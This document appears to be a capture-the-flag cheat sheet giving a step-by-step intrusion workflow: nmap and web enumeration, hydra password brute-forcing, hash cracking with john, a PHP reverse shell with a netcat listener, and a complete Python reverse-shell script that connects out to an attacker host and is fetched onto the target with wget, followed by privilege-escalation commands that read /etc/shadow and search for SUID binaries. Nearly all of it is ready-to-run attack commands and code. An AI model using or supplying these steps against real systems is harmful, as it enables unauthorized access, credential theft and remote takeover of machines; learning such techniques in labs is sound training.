# SCANNING
> First of all, let's scan the open ports and their versions.

```
nmap -A -p- -T4 [Target IP Address] -oN [../nmapresult.txt]
```
> How many ports open?
```
nmap -vvv [Target IP Address]
```
> What vulnerabilities exist in this machine?
```
nmap -p- --script vuln [Target IP Address]
```
<br>
<br>

> If Apache2 or any web server is running;
> First, let's find the folders on the server.

```
dirb http://[Target IP Address]
```
> Or let's try alternative scanning methods.

```
gobuster dir -u http://[Target IP Address] -w [../dirbuster/wordlist.txt]
nikto -h [Target IP Address]
```
> After the scans are completed, the web server (if any) is visited and all information is collected:
<br>

# BRUTE FORCE
> Let's try to crack the usernames we found with a brute force attack.

```
hydra -l [Username We Found] -P [../wordlist.txt] [Whichever Port is Open]://[Target IP Address]
hydra -l [Username We Found] -P [../wordlist.txt] http-post-form "[HTTP Post Form]" -v
hydra -l [../Userlist.txt] -P [../wordlist.txt] [Target IP Address] [Whichever Port is Open]://[Target IP Address]
```
> For example:

```
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l james -P /home/kali/Downloads/givenbyctf.txt http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid" -v
hydra -l /home/kali/Documents/CTF's/attactive-directory/userlist.txt -P /usr/share/wordlists/fasttrack.txt 10.10.10.10 ssh://10.10.10.10
```
<br>
<br>

> If WordPress:
```
wpscan --url [Target IP Address] --passwords [../wordlist.txt] --usernames [Admin Username]
```
> If we see something encrypted:
```
john [../hash.txt] --wordlist=[../wordlist.txt]
john --format=[Format of the Hash] [../hash.txt]
```
> If something is hidden inside the image file (like steganography):
```
strings [../file.png]
stegcracker [../file.jpg] [../wordlist.txt]
steghide extract -sf [../file.jpg]
binwalk [../file.jpg]
binwalk --run-as=root [../file.jpg] -e
```
> If we haven't made much progress with the brute force attack, but we have an id_rsa:
<br>

# GAINING ACCESS TO LINUX WITH SSH_KEY
> For SSH key to work:
```
chmod 600 [Key]
```
> Connection with SSH key:
```
ssh [Username]@[Target IP Address] -i [Key]
```
> If it asks us for a password:
```
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=[../wordlist.txt]
```
> And, repeat the above.
> If there is still no gaining access, we can try a pHp reverse shell on the web server.
<br>

# PHP REVERSE SHELL
> First, open the php document. (If you search for this php file as php-reverse-shell, you will see many examples.)
```
nano ../php-reverse-shell.php
```
> And edit the file. If you see "change $ip= " in the file, enter your own machine's IP address there. If you are connected to sites such as tryhackme via VPN, enter the IP address you are connected to.
> Let's open another terminal on us own machine and start listening to the port written in the php-reverse-shell.php file:
```
nc -nvlp [Port]
```
> Run php-reverse-shell.php on the website. For example:
```
http://[Target Website]/uploads/php-reverse-shell.php
```
> If we have gained access to the port we are listening to via Netcat, but the Linux commands we are used to are not working, let's check whether this is Python.
```
print("cozuxhub")
```
> If we have seen any text we wrote in the print command as output, it is time to open a shell:
<br>

# PYTHON SHELL
> To open terminal:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
> If it doesn't work, do this first:
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
> Or, create a document.py in the /var/www/html on your machine and type this:
```
        import socket
        import subprocess
        import os

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.0.2.4",5555))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
```
> We first need to start the Apache2 server on we own machine.
```
service apache2 start
```
> Go to target machine and copy this file from we apache2 server.
```
wget http://[Your IP Address]/[document.py]
```
> Let's run this python file on our target machine.
```
python document.py
/usr/bin/python document.py
```
> If we are now a user on the target machine but do not have sufficient privileges, next is privilege escalation.
<br>

# LINUX PRIVILEGE ESCALATION
> First of all, get informaton from the machine.
```
whoami
id
uname -a
cat /proc/version
cat /etc/issue
cat /etc/shadow
cat /etc/passwd
cat /etc/sudoers
cat /etc/crontab
ps aux
ifconfig
locate password
find / -name password 2>/dev/null
find . type f -exec grep -i -I "PASSWORD" {} /dev/null \;
find / -type f -perm -04000 -ls 2>/dev/null
```
<br>
<br>

> Shows the commands of the user before you:
```
history
```
> Shows what the current user can do:
```
find / -perm -u=s -type f 2>/dev/null
```
> Shows the commands:
```
ls -la /usr/bin
```
> Let's see which commands can run without root:
```
sudo -l
find / -type f -perm -04000 -ls 2>/dev/null
```
<br>
<br>

> From here, we are likely to encounter thousands of possibilities. Since each machine has a different vulnerability, we must do our own research after the basic operations.
